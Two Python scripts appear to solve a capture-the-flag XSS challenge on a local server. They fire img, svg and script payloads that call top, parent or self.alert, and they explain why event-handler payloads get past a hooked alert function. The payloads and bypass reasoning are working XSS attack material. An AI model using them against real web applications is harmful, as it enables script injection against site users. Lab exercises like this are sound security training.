import requests
import re

target = "http://127.0.0.1:32955/page"

# Test various window hierarchy references
test_cases = [
    # Try tag stripping to inject JS that accesses window hierarchy
    ("img onerror=top.alert", "<img src=x onerror=top.alert('XSS')>"),
    ("img onerror=parent.alert", "<img src=x onerror=parent.alert('XSS')>"),
    ("img onerror=self.alert", "<img src=x onerror=self.alert('XSS')>"),
    ("img onerror=window.parent.alert", "<img src=x onerror=window.parent.alert('XSS')>"),
    ("img onerror=window.top.alert", "<img src=x onerror=window.top.alert('XSS')>"),
    # Try SVG
    ("svg onload=top.alert", "<svg onload=top.alert('XSS')>"),
    ("svg onload=parent.alert", "<svg onload=parent.alert('XSS')>"),
    # Try direct injection via tag stripping
    ("script stripped", "<script>top.alert('XSS')</script>"),
    ("script parent", "<script>parent.alert('XSS')</script>"),
]

print("Testing Window Hierarchy References:")
print("="*60)

for name, payload in test_cases:
    response = requests.get(target, params={'name': payload})
    text = response.text
    
    # Extract the solution-text content
    match = re.search(r'<div class="solution-text">(.*?)</div>', text, re.DOTALL)
    if match:
        result = match.group(1).replace('<br>', '\n').replace('<img[^>]+>', '')
        # Clean up HTML tags
        result = re.sub(r'<[^>]+>', '', result)
        print(f"\n[TEST: {name}]")
        print(f"Payload: {payload[:50]}...")
        print(f"Result: {result}")
        
        # Check if successful or what error occurred
        if "Good Luck" in result:
            print("[+] SUCCESS! XSS executed successfully!")
        elif "TypeError" in result:
            print(f"[!] Alert hooked (same window): {result[:100]}")
        elif "Fail" in result:
            print(f"[-] Execution failed: {result}")
        else:
            print(f"[?] Unknown result")

import requests
import re

target = "http://127.0.0.1:32955/page"

# Verify the successful payloads
successful_payloads = [
    "<img src=x onerror=top.alert('XSS')>",
    "<img src=x onerror=parent.alert('XSS')>",
    "<img src=x onerror=self.alert('XSS')>",
    "<svg onload=top.alert('XSS')>",
    "<svg onload=parent.alert('XSS')>",
]

print("="*60)
print("VERIFICATION - Successful Window Hierarchy Payloads")
print("="*60)

for payload in successful_payloads:
    response = requests.get(target, params={'name': payload})
    text = response.text
    
    # Extract result
    match = re.search(r'<div class="solution-text">(.*?)</div>', text, re.DOTALL)
    if match:
        result = match.group(1)
        result_clean = re.sub(r'<[^>]+>', '', result).replace('\n', ' ')
    else:
        result_clean = "No solution-text found"
    
    success = "Good Luck" in result_clean
    status = "✓ SUCCESS" if success else "✗ FAILED"
    
    print(f"\n{status}: {payload}")
    print(f"Result: {result_clean}")

print("\n" + "="*60)
print("ANALYSIS:")
print("="*60)
print("""
The vulnerability works because:
1. HTML tags are stripped but content remains
2. Event handlers (onerror, onload) execute in a different window context
3. In event handler context, alert is NOT hooked via Object.defineProperty
4. top.alert, parent.alert, self.alert all work because they reference
   the unhooked alert from the event handler's execution context

Key difference:
- <script>top.alert('XSS')</script> → FAILS (same window, alert hooked)
- <img onerror=top.alert('XSS')> → SUCCESS (different context, unhooked)
""")

